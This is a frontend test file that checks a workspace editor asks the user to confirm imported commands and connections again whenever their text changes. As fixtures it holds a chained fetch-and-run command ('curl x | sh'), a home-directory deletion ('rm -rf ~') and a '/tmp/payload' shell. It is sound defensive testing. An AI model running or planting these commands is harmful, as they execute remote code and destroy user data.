/**
 * #4434: the workspace editor lists an imported workspace's held commands and
 * inline connections and lets the user confirm them on this machine.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { act } from "react";
import { createRoot, Root } from "react-dom/client";
import { useAppStore } from "@/store/appStore";
import { seedSettings, setupSettingsRegion } from "@/test/settingsRegionTestHarness";
import { importedCommandKey } from "@/services/workspaceImportTrust";
import type { WorkspaceTabDef, WorkspaceTabGroupDef } from "@/types/workspace";
import { ImportedItemsSection } from "./ImportedItemsSection";

setupSettingsRegion();

function groups(...tabs: WorkspaceTabDef[]): WorkspaceTabGroupDef[] {
  return [{ name: "Main", layout: { type: "leaf", tabs } }];
}

/**
 * Waits for an observable outcome. The allowlist keys are sha256 digests from
 * WebCrypto, which resolve on a worker thread, so no fixed number of microtask
 * or timer turns is guaranteed to see them (#4483).
 */
async function until(assertion: () => void, timeoutMs = 5000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    // Each turn runs inside act() so the key-resolution re-render is flushed.
    await act(async () => {
      await new Promise((r) => setTimeout(r, 5));
    });
    try {
      assertion();
      return;
    } catch (error) {
      if (Date.now() > deadline) throw error;
    }
  }
}

describe("ImportedItemsSection (#4434)", () => {
  let container: HTMLDivElement;
  let root: Root;
  const updateSettings = vi.fn(() => Promise.resolve());

  beforeEach(() => {
    container = document.createElement("div");
    document.body.appendChild(container);
    root = createRoot(container);
    useAppStore.setState({ updateSettings } as never);
  });

  afterEach(() => {
    act(() => root.unmount());
    container.remove();
    useAppStore.setState(useAppStore.getInitialState());
    vi.clearAllMocks();
  });

  const byTestId = (id: string) => container.querySelector<HTMLElement>(`[data-testid="${id}"]`);
  const confirmButton = () =>
    container.querySelector<HTMLButtonElement>(
      '[data-testid="workspace-imported-confirm-0-0-0-cmd"]'
    );
  const rowText = () => byTestId("workspace-imported-item-0-0-0-cmd")?.textContent ?? "";

  it("renders nothing for a locally created workspace", async () => {
    act(() =>
      root.render(
        <ImportedItemsSection
          tabGroupDefs={groups({
            initialCommand: "npm start",
            inlineConfig: { type: "local", config: {} },
          })}
        />
      )
    );
    expect(byTestId("workspace-imported-items")).toBeNull();
  });

  it("lists an unconfirmed imported command and confirms it on click", async () => {
    act(() =>
      root.render(
        <ImportedItemsSection
          tabGroupDefs={groups({ title: "Build", pendingInitialCommand: "make deploy" })}
        />
      )
    );
    const row = byTestId("workspace-imported-item-0-0-0-cmd");
    expect(row?.textContent).toContain("make deploy");
    expect(row?.textContent).toContain("Build (Main)");
    // The button stays disabled until the item's allowlist key has resolved.
    await until(() => expect(confirmButton()?.disabled).toBe(false));

    await act(async () => {
      confirmButton()?.click();
    });
    const key = await importedCommandKey("make deploy");
    await until(() =>
      expect(updateSettings).toHaveBeenCalledWith(
        expect.objectContaining({ workspaceImportAllowlist: [key] })
      )
    );
  });

  it("shows a confirmed command as confirmed, and asks again once its text changes", async () => {
    seedSettings({ workspaceImportAllowlist: [await importedCommandKey("make deploy")] });
    act(() =>
      root.render(
        <ImportedItemsSection tabGroupDefs={groups({ pendingInitialCommand: "make deploy" })} />
      )
    );
    await until(() => expect(rowText()).toContain("Confirmed on this machine"));

    act(() =>
      root.render(
        <ImportedItemsSection
          tabGroupDefs={groups({ pendingInitialCommand: "make deploy && curl x | sh" })}
        />
      )
    );
    await until(() => expect(confirmButton()?.disabled).toBe(false));
    expect(rowText()).not.toContain("Confirmed on this machine");
  });

  // #4483: the keys are resolved asynchronously and the row ids are positional,
  // so a key resolved for the previous text must not stand in for the new text
  // while the new key is still hashing.
  it("never shows edited text as confirmed while its new key is still hashing", async () => {
    seedSettings({ workspaceImportAllowlist: [await importedCommandKey("make deploy")] });
    act(() =>
      root.render(
        <ImportedItemsSection tabGroupDefs={groups({ pendingInitialCommand: "make deploy" })} />
      )
    );
    await until(() => expect(rowText()).toContain("Confirmed on this machine"));

    // Synchronous render: WebCrypto cannot have hashed the new text yet.
    act(() =>
      root.render(
        <ImportedItemsSection
          tabGroupDefs={groups({ pendingInitialCommand: "make deploy && curl x | sh" })}
        />
      )
    );
    expect(rowText()).toContain("make deploy && curl x | sh");
    expect(rowText()).not.toContain("Confirmed on this machine");
    expect(confirmButton()?.disabled).toBe(true);
  });

  it("never confirms the previous text when Confirm is clicked right after an edit", async () => {
    act(() =>
      root.render(
        <ImportedItemsSection tabGroupDefs={groups({ pendingInitialCommand: "make deploy" })} />
      )
    );
    await until(() => expect(confirmButton()?.disabled).toBe(false));

    act(() =>
      root.render(
        <ImportedItemsSection tabGroupDefs={groups({ pendingInitialCommand: "rm -rf ~" })} />
      )
    );
    await act(async () => {
      confirmButton()?.click();
    });
    await until(() => expect(confirmButton()?.disabled).toBe(false));

    const staleKey = await importedCommandKey("make deploy");
    for (const [arg] of updateSettings.mock.calls as unknown as [
      { workspaceImportAllowlist?: string[] },
    ][]) {
      expect(arg.workspaceImportAllowlist ?? []).not.toContain(staleKey);
    }
  });

  it("lists an unconfirmed inline connection with what it opens", async () => {
    act(() =>
      root.render(
        <ImportedItemsSection
          tabGroupDefs={groups({
            inlineConfig: { type: "local", config: { shell: "/tmp/payload" } },
            inlineConfigUnconfirmed: true,
          })}
        />
      )
    );
    expect(byTestId("workspace-imported-item-0-0-0-conn")?.textContent).toContain(
      "local shell /tmp/payload"
    );
    await until(() =>
      expect(
        container.querySelector<HTMLButtonElement>(
          '[data-testid="workspace-imported-confirm-0-0-0-conn"]'
        )?.disabled
      ).toBe(false)
    );
  });
});
